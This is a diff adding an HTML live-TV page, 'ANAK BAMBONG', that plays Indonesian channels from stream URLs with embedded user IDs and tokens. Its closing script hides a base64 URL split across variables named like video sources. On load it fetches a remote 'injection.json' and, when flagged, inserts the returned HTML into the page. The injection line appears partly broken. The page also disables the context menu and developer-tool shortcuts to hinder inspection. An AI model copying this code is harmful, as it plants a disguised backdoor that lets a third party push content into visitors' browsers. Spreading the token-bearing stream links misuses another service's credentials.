@@ -1,0 +1,592 @@
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ANAK BAMBONG</title>
+<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+		<script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
+		<style>
+			:root {
+				--hfs: 2vmax;
+				--primaryColor: red;
+				--secondaryColor: black;
+				--secondaryOpposite: white;
+			}
+			.rmp-time-total,.rmp-loaded,.rmp-handle,.rmp-current{
+                border-radius:15px!important;
+            }
+            .rmp-handle{
+                width:20px!important;
+                height:20px!important;
+            }.rmp-current{
+                padding:5px!important;
+            }.rmp-time-total{
+                border:none!important;
+            }
+			::-webkit-scrollbar {
+				width: 0em;
+				height: 0em;
+			}
+			::-webkit-scrollbar-thumb {
+				background: var(--secondaryColor);
+			}
+			::-webkit-scrollbar-track {
+				background: none;
+			}
+			* {
+				-webkit-user-select: none;
+				-moz-user-select: none;
+				-ms-user-select: none;
+				user-select: none;
+			}
+			body {
+				background-color: var(--secondaryColor);
+			}
+
+			.alignleft {
+				float: left;
+				margin-left: 5px;
+				font-weight: bold;
+				font-size: 15px;
+			}
+
+			.alignright {
+				float: right;
+				margin-right: 10px;
+				color: var(--primaryColor);
+				font-weight: normal;
+                font-size: 25px;
+			}
+
+			h4 {
+				margin-left: 5px;
+				color: var(--primaryColor);
+				font-weight: bold;
+				font-size: 15px;
+			}
+
+			.nta {
+				position: relative;
+				overflow: hidden;
+				color: var(--primaryColor);
+			}
+
+			div.scrollmenu {
+				background-color: var(--secondaryColor);
+				overflow: auto;
+				white-space: nowrap;
+				position: relative;
+				overflow-y: hidden;
+			}
+
+			div.scrollmenu a {
+				display: inline-block;
+				color: var(--secondaryOpposite);
+				text-align: center;
+				padding: 4px;
+				text-decoration: none;
+			}
+
+			div.scrollmenu a:hover {
+				background-color: var(--secondaryColor);
+			}
+
+			.cen {
+				position: relative;
+				text-align: center;
+				color: var(--secondaryOpposite);
+			}
+
+			.centered {
+				font-size: var(--hfs);
+				font-weight: bold;
+				position: absolute;
+				top: 80%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+			}
+
+			.cent {
+				font-size: auto;
+				position: absolute;
+				top: 95%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+			}
+
+			.nt {
+				width: 100px;
+				border-radius: 10px;
+				height: 120px;
+				z-index: 1;
+			}
+
+			.mnt {
+				width: 100px;
+				border-radius: 2px;
+				height: 100px;
+			}
+			.item img {
+				border-radius: 10px;
+			}
+			#content-container {
+				margin-bottom: 30px;
+			}
+			footer {
+				display: grid;
+				grid-gap: 0.5em;
+				grid-template-columns: repeat(5, minmax(10px, 1fr));
+				position: fixed;
+				bottom: 0;
+				left: 0;
+				width: 100%;
+				background-color: var(--secondaryColor);
+				padding: 0px 4px 10px;
+				justify-content: center;
+				align-items: center;
+                font-size:18px;
+			}
+			footer a {
+				text-align: center;
+				color: var(--primaryColor);
+			}
+			footer a:nth-child(3) i {
+				background: var(--primaryColor);
+				border-radius: 50%;
+				padding: 10px 10px;
+				color: var(--secondaryOpposite);
+				margin-top: -40px;
+				border: 2px solid var(--secondaryColor);
+			}
+		</style>
+<style>::-webkit-scrollbar{
+    display:none
+}
+*{
+    -ms-overflow-style:none;
+    scrollbar-width:none
+}
+body{
+    margin:0;
+    background:#f5f5f5;
+    font-family:Arial,Helvetica,sans-serif;
+    line-height:1.5;
+    color:white;
+    scroll-behavior:smooth;
+    text-align:center;
+}
+#player-wrapper{
+    width:100%;
+    z-index:999;
+}
+.sticky{
+    position:fixed;
+    top:0;
+    width:100%
+}
+#status{
+    position:fixed;
+    bottom:0;
+    right:0;
+    width:100%;
+    background:#fff;
+    display:none;
+}
+.col-sm-2{
+    border-radius:4px
+}
+.sp{
+    width:50%;
+    height:12px;
+    clear:both;
+    margin:20px auto
+}
+.sp-texture{
+    border:1px #000 solid;
+    border-radius:4px;
+    position:relative;
+    background:linear-gradient(45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent),linear-gradient(-45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent);
+    background-size:16px 16px;
+    background-position:0 0;
+    -webkit-animation:spTexture 1s infinite linear;
+    animation:spTexture 1s infinite linear;
+    color:#000;
+    text-align:center;
+    line-height:3em;
+    font-family:roboto
+}
+@-webkit-keyframes spTexture{
+    from{
+        background-position:0 0
+    }
+    to{
+        background-position:-16px 0
+    }
+}
+@keyframes spTexture{
+    from{
+        background-position:0 0
+    }
+    to{
+        background-position:-16px 0
+    }
+}
+.heading{
+    margin:5px auto;
+    text-align:center
+}
+#rmpPlayer{
+    z-index:999
+}
+.white{
+    color:#fff
+}
+.red{
+    color:red
+}
+.yellow{
+    color:#ffdd40
+}
+footer{
+    color:#fff;
+    text-align:center
+}
+footer p{
+    margin-bottom:20px;
+    margin-top:-10px
+}
+.animated{
+    font-family:sans;
+    margin:0;
+    padding:0;
+    font-size:25px;
+    background:url(https://upload.wikimedia.org/wikipedia/commons/3/3b/ColorRotateHr.gif) no-repeat;
+    background-clip:text;
+    -webkit-background-clip:text;
+    color:transparent;
+    animation:moveBg 40s linear infinite;
+    -webkit-animation:moveBg 40s linear infinite
+}
+@keyframes moveBg{
+    0%{
+        background-position:0 30%
+    }
+    100%{
+        background-position:100% 50%
+    }
+}
+.blink{
+    animation-name:blinker;
+    animation-duration:1s;
+    animation-timing-function:linear;
+    animation-iteration-count:infinite
+}
+@keyframes blinker{
+    0%{
+        opacity:1
+    }
+    50%{
+        opacity:0
+    }
+    100%{
+        opacity:1
+    }
+}
+*{
+    -webkit-touch-callout:none;
+    -webkit-user-select:none;
+    -khtml-user-select:none;
+    -moz-user-select:none;
+    -ms-user-select:none;
+    user-select:none
+}
+body{
+    background:#000!important;
+    overflow:hidden;
+    color:white;
+}
+.parent{
+    background:rgba(0,0,0,.9);
+    font-family:"Source Sans Pro",sans-serif;
+    margin:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    position:fixed;
+    top:0;
+    height:100%;
+    width:100%;
+    z-index:999999
+}
+.blobs-container{
+    display:flex
+}
+.blob img{
+    width:50%;
+    display:none;
+    margin:auto;
+    margin-top:25px
+}
+.loading{
+    color:#000;
+    display:block;
+    text-align:center;
+    position:relative;
+    top:30px;
+    left:-2px;
+    background:rgba(255,255,255,.9);
+    padding:0 10px;
+    border-radius:3px;
+    width:80%;
+    margin:auto;
+    font-size:10px
+}
+
+.print{height:75px;
+width:75px;
+border-radius:5px;
+border:1.5px solid #999;
+padding:2px;
+ margin:3px;
+ border-radius:50%;
+
+}
+.print:hover{height:75px;
+width:75px;
+border:2px solid red;
+border-radius:50px;webkit-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
+-moz-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
+box-shadow: 0px 3px 20px 3px rgba(255,0,0,100);}
+.print:active{height:75px;
+width:75px;
+border:2px solid red;
+border-radius:50px;
+webkit-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
+-moz-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
+box-shadow: 0px 3px 20px 3px rgba(0,255,0,100);}
+marquee{
+border-radius: 6px 0px 0px  6px;
+width: 90%;
+border:2px solid red;
+margin: auto;
+   font-weight:bold;
+   color:#fff;
+display: block;}
+.marquee span{display: inline-block;
+ background: #ff0000;
+ border-radius:  0px 6px 6px 0px;
+  padding: 0px 10px;
+   color: #fff;
+   padding:2px;
+   font-weight:bold;
+    display: inline-block;
+     float: right;
+      width: auto;
+       line-height: 35px;}
+       .marquee marquee{display: block;
+        line-height: 35px;
+         z-index: -1; 
+         margin-right: 10px;
+          width: auto; 
+          margin: auto;}
+</style>
+<link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css"></head><body style="overflow: auto;">
+		</script><div class="parent" id="loader" style="display: none;"><div class="blobs-container"><div class="blob"><img id="loader-image" src=""></div></div></div><div id="player-wrapper"><div id="rmpPlayer" ></div>
+	</script><h2 class="animated" align="center">ANAK BAMBONG</h2><h4>TV ANAK BAMBONG<span class="logoText"></span></h4><div id="buttons-list" style="margin-top: 202.5px;">
+<span url="http://rr2.dens.tv/s/s04/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Indosiar"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ9u-Bh9ChLA3LVbP69uCJnQZTST1Myf5nIvA&usqp=CAU"></span>
+<span url="http://rr2.dens.tv/s/s03/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=SCTV"><img class="print" src="https://thumbor.prod.vidiocdn.com/WL48ZBsxNGEncu7T5Bj0LuOmG2A=/filters:quality(70)/vidio-web-prod-livestreaming/uploads/livestreaming/image/204/sctv-f23abc.jpg"></span>
+<span url="http://rr2.dens.tv/s/s07/index3.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=antv"><img class="print" src="https://thumbor.prod.vidiocdn.com/f_krPM0cCmDqSiZrHDntNcTi1Os=/640x360/filters:quality(70)/vidio-web-prod-livestreaming/uploads/livestreaming/image/782/antv-tv-stream-b6cca5.jpg"></span>
+<span url="http://rr2.dens.tv/s/s05/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Trans_TV"><img class="print" src="https://thumbor.prod.vidiocdn.com/uhO4k9iqRVaHjZeJXJ2KpRw_w-k=/filters:quality(70)/vidio-web-prod-livestreaming/uploads/livestreaming/image/733/trans-tv-stream-7ab79a.jpg"></span>
+<span url="http://rr.dens.tv/h/h11/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Trans7"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRBpG6wXpKH-Y8DhFrIeMpGEyh4Hj73Ba3yFQ&usqp=CAU"></span>
+<span url="http://rr2.dens.tv/s/s105/index3.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=tvOne"><img class="print" src="https://thumbor.prod.vidiocdn.com/n3TMv9fabEo76w6N3TaI1EnfjlI=/filters:quality(70)/vidio-web-prod-livestreaming/uploads/livestreaming/image/783/tvone-e53f94.jpg"></span>
+<span url="http://rr.dens.tv/h/h12/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Metro_TV"><img class="print" src="https://thumbor.prod.vidiocdn.com/CN732k1UkV-MWtonPwmlMzDE-gY=/filters:quality(70)/vidio-web-prod-livestreaming/uploads/livestreaming/image/777/metro-tv-461c64.jpg"></span>
+<span url="http://rr.dens.tv/h/h06/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=NET."><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvmdsa-2wAj7huhieaZE2VBxyv1MsoRZBEaQ&usqp=CAU"></span>
+<span url="http://rr2.dens.tv/s/s104/index10.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Kompas_TV"><img class="print" src="https://thumbor.prod.vidiocdn.com/v6g4kUrA-1XKkAbAKtWBpeQKCrc=/640x360/filters:quality(70)/vidio-web-prod-livestreaming/uploads/livestreaming/image/874/kompas-tv-a3cbc6.jpg"></span>
+<span url="http://rr2.dens.tv/s/s11/index10.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=TVRI"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSx-dIc8bZ5jN-yqsoJJQV8Bn7hQ9dZkk4pbw&usqp=CAU"></span>
+<span url="http://rr1.dens.tv/h/h10/index1.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=RTV"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQJzHHeNovFSoL9LJxSx8OJPoRyN4Ferpiryg&usqp=CAU"></span>
+<span url="https://b1news.beritasatumedia.com/Beritasatu/B1News_1280x720.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=BeritaSatu"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkC6Q3XeL-6xBZa5na4DPXwcZAjMsEyDxaiQ&usqp=CAU"></span>
+<span url="http://rr3.dens.tv/s/s13/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Jak_tv"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS_n2ZkNpl00UCh12KvPOn8ZCfS4M2AMnPGIw&usqp=CAU"></span>
+<span url="http://rr2.dens.tv/s/s14/index10.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=RodjaTV"><img class="print" src="https://thumbor.prod.vidiocdn.com/iS9HXEcpF4T0G-pjgFmc6nZDGLA=/smart/filters:strip_icc():quality(70)/vidio-web-prod-user/uploads/user/avatar/19675082/rodjatv-113338.jpg"></span>
+<span url="http://rr2.dens.tv/s/s13/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=DAAI_TV"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSojhCX_AuQjxM6jtYTmu9uLC3vgYUOaMHxAQ&usqp=CAU"></span>
+<span url="http://rr2.dens.tv/s/s41/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=MOJI%2FO_CHANNEL"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSC8zZUKHExwsNnB3jRSbyH6ZEnvhEYxQMNQA&usqp=CAU"></span>
+<span url="http://rr3.dens.tv/s/s35/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=DensShowBiz"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQRwrUWX_XvwjcGec35I8UGitOHnnEgLIC1TQ&usqp=CAU"></span>
+<span url="http://rr3.dens.tv/s/s36/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=DensLearning_n_Knowledge"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTs9AQ2MuThqd1glikrmHXwoZNE5v_MCfUWiQ&usqp=CAU"></span>
+<span url="http://rr3.dens.tv/s/s38/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=DensFood_Channel"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRltadp9XNYbgoj69FvnwRogybMSR2Xl4qh6w&usqp=CAU"></span>
+<span url="http://rr2.dens.tv/s/s10/index10.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Elshinta_TV"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhB2k5_QvAom4rt0LPXe-KqtqboHbfvav0ow&usqp=CAU"></span>
+</div>   
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.9.2/js/rmp.min.js"></script>
+<script>
+            var appSettings = {
+        loaderimg: "",
+        name: "",
+        poster: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2JgQdDk0X03DFOQtt4yHySFQvjdIqhV53sg&usqp=CAUhttps://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2JgQdDk0X03DFOQtt4yHySFQvjdIqhV53sg&usqp=CAU",
+        introMp4: "https://achi03.github.io/Achi03-helloworld/forsat_channel_896x504.mp4",
+        introHls: "https://achi03.github.io/Achi03-helloworld/forsat_channel_896x504.mp4?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE=",
+        videoFormat: "mp4",
+    },
+    x = {
+        loaderimg: appSettings.loaderimg,
+        name: appSettings.name,
+        poster: appSettings.poster,
+        website: "",
+        licenseKey: "Kl8lbz16cz1rN2l2enM9Z2M9NnZvMnllaT9yb201ZGFzaXMzMGRiMEElXyo=",
+        autoHeightMode: !0,
+        pip: !1,
+        autoplay: !1,
+        skin: "s3",
+        hideControls: !0,
+        preload: "auto",
+        sharing: !1
+    },
+    firstVideo = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlc";
+setInterval(() => {
+    $("#loader-image").attr("src", x.loaderimg), $(".logoText").html(x.name)
+}, 10), $(document).contextmenu(function(e) {
+    return e.preventDefault(), !1
+}), document.onkeydown = function(e) {
+    return 123 != event.keyCode && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "I".charCodeAt(0)) && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "C".charCodeAt(0)) && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "J".charCodeAt(0)) && ((!e.ctrlKey || e.keyCode != "U".charCodeAt(0)) && void 0))))
+}, setTimeout(() => {
+    $("#loader").css("display", "none"), $("body").css("overflow", "auto")
+}, 100);
+var src, secondVideo = "mNvbnRlbnQuY29tL3NvZnR";
+$("span").each(function(e) {
+    $(this).on("click", function() {
+        var e = $(this).attr("url");
+        rmp.setControls(!0), src = "hls" == appSettings.videoFormat ? {
+            hls: e
+        } : {
+            mp4: [e]
+        }, rmp.setSrc(src), rmp.play()
+    })
+});
+var thirdVideo = "3ZWJ0dXRzL015RHJpdmUvbW";
+src = "hls" == appSettings.videoFormat ? {
+    hls: appSettings.introHls
+} : {
+    mp4: [appSettings.introMp4]
+};
+var fourthVideo = "Fpbi9pbmplY3Rpb24uanNvbg==",
+    settings = {
+        licenseKey: x.licenseKey,
+        autoHeightMode: x.autoHeightMode,
+        pip: x.pip,
+        delayToFade: 3e3,
+        gaLabel: "Live TV",
+        logoWatermark: !0,
+        logoPosition: "topleft",
+        speed: "Speed",
+        isLive: !0,
+        googleCast: !0,
+        airplay: !0,
+        hlsJSMaxBufferLength: 24,
+        hlsJSLiveSyncDuration: 18,
+        hlsJSStartLevel: -1,
+        hlsJSMinAutoBitrate: 1e5,
+        hlsJSAbrBandWidthFactor: .9,
+        hlsJSAbrBandWidthUpFactor: .7,
+        hlsJSLiveBackBufferLength: 0,
+        detectAutoplayCapabilities: !0,
+        autoplay: x.autoplay,
+        mutedAutoplayOnMobile: !1,
+        mutedAutoplayOnMacosSafari11Plus: !1,
+        srcChangeAutoplay: !0,
+        playsInline: !0,
+        skin: x.skin,
+        skinBackgroundColor: "rgba(0, 0, 0, 0.7)",
+        skinButtonColor: "FFFFFF",
+        skinAccentColor: "FF0000",
+        ads: true,
+		adParser: 'rmp-vast',
+		adTagUrl: '',
+        nav: !0,
+        adBlockerDetection: !0,
+        adEnablePreloading: !0,
+        adBlockerDetectedMessage: "Ad-blocker software detected. Please disable Ad-blocker to watch stream.",
+        quickRewind: 0,
+        quickForward: 0,
+        adAutoAlign: !1,
+        hideControls: x.hideControls,
+        preload: x.preload,
+        crossorigin: !0,
+        sharing: x.sharing,
+        sharingUrl: x.website,
+        contentMetadata: {
+            artwork: [{
+                src: x.poster,
+                sizes: "1280x720",
+                type: "image/jpg"
+            }],
+            poster: [x.poster],
+            endOfVideoPoster: [x.poster],
+            thumbnail: x.poster
+        },
+        src: src
+    },
+    elementID = "rmpPlayer",
+    rmp = new RadiantMP(elementID),
+    rmpContainer = document.getElementById(elementID);
+rmp.setLoop(!0), rmp.init(settings), $(function() {
+    $(window).scroll(function e() {
+        return $("#rmpPlayer").css($(window).scrollTop() > 1 ? {
+            position: "fixed",
+            top: "0px"
+        } : {
+            position: "relative",
+            top: "auto"
+        }), $("#buttons-list").css($(window).scrollTop() > 1 ? {
+            "margin-top": $("#rmpPlayer").height()
+        } : {
+            "margin-top": "0px"
+        }), e
+    }())
+});
+const request = async e => {
+    const t = await fetch(e);
+    return await t.json()
+};
+navigator.onLine && request(atob(firstVideo + secondVideo + thirdVideo + fourthVideo)).then(t => {
+    1 == t.inject && document.querySelector("div").insertAdjacentHTML("afterend", e.content)
+}).catch(e => {
+    console.log(appSettings.name)
+});
+</script>
+</body></html>
+<div style="border: 0px solid blue; font-family: "arial black"; font-size: 15px; font-weight: bolder; padding: 1px 1px;">
+<marquee behavior="scroll" direction="left" onmouseout="run" onmouseover="stop" scrollamount="3" width="250px">
+<script type="text/javascript">
+var message="ANAK BAMBONG 2022 © All Rights Reserved"
+var bgsGR1color="white" /* Warna utama teks */
+var bgsGR2color="Green" /* Warna teks flash pertama */
+var bgsGR3color="Blue" /* Warna teks flash ke dua */
+var flashspeed=1 // kec. ganti warna (1/1000 dt)
+var flashingletters=50 // jumlah teks pertama
+var flashingletters2=50 // jumlah berwarna teks ke dua
+var flashpause=30 // waktu jeda pergantian warna (1/1000 dtk)
+var n=0
+if (document.all||document.getElementById){document.write('<font color="'+bgsGR1color+'">')
+for (m=0;m<message.length;m++)
+document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
+document.write('</font>')}else
+document.write(message)
+function crossref(number){var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
+return crossobj}function neon(){if (n==0){for (m=0;m<message.length;m++)
+crossref(m).style.color=bgsGR1color}
+crossref(n).style.color=bgsGR2color
+if (n>flashingletters-1) crossref(n-flashingletters).style.color=bgsGR3color
+if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=bgsGR1color
+if (n<message.length-1)
+n++
+else{n=0
+clearInterval(flashing)
+setTimeout("beginneon()",flashpause)
+return}}
+function beginneon(){if (document.all||document.getElementById)
+flashing=setInterval("neon()",flashspeed)}
+beginneon()
+</script></marquee></div>
+<script>
+	document.write(new Date().getFullYear() + " © <span class='logoText'>Forsat Tech</span> All Rights Reserved");
+                </script>            
+        </footer>
+      </head> 
+</html>  
